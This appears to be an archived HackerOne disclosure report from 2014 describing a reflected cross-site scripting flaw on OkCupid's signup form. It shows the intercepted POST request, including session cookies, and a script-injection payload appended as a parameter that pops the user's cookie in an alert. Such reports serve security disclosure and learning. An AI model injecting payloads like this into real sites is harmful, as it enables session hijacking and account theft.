@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/8278
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/virii
+ReportedTo:OkCupid(okcupid)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:30.04.2014 0:36:12
+
+Summary:
+
+Reflected XSS on www.okcupid.com/signup
+
+Im using Live HTTP Header for this bug.
+
+1) Go to https://www.okcupid.com/signup
+2) Click on continue
+3) Enter details
+4) Live HTTP Headers or any HTTP Editor should be running before clicking "Next" button.
+5) Edit the following POST Headers :
+
+Host: www.okcupid.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://www.okcupid.com/signup
+Cookie: guest=16676710703947587798; core=82196867_b01.c01.c02.c05.c10.d01.e01.e03.f12.f13.f14.f17.f18.f21.f23.f25.f26.f27.f33.f34.f43.f44.f59.f60.f62.f65.f66.f67.f70.f75.j57.j62; signup_experiment_20140210=new_signup_free
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 303
+
+next_page=%2Fsignup%2Fpaths%2Fsplash_new_inga%2F3.html&status=1&opento=1&experiment_name=new+signup+free&page=4&gender=2&orientation=1&screenname=&birthmonth=1&birthday=1&birthyear=1996&country=United+States&zip_or_city=23487&locid=4214966&lquery=23487&email=hackerone%40me.com&email2=hackerone%40me.com
+
+
+
+6) Add the following lines (payload) at the end of the POST Content :
+
+&ViRii"><script>alert(document.cookie)<%2fscript>hackerone=1
+
+7) Now, the POST content should be like this :
+
+next_page=%2Fsignup%2Fpaths%2Fsplash_new_inga%2F3.html&status=1&opento=1&experiment_name=new+signup+free&page=4&gender=2&orientation=1&screenname=&birthmonth=1&birthday=1&birthyear=1996&country=United+States&zip_or_city=23487&locid=4214966&lquery=23487&email=hackerone%40me.com&email2=hackerone%40me.com&ViRii"><script>alert(document.cookie)<%2fscript>hackerone=1
+
+
+8) Click Reply button on Live HTTP Reply
+9) Message box containing your cookie will appear.
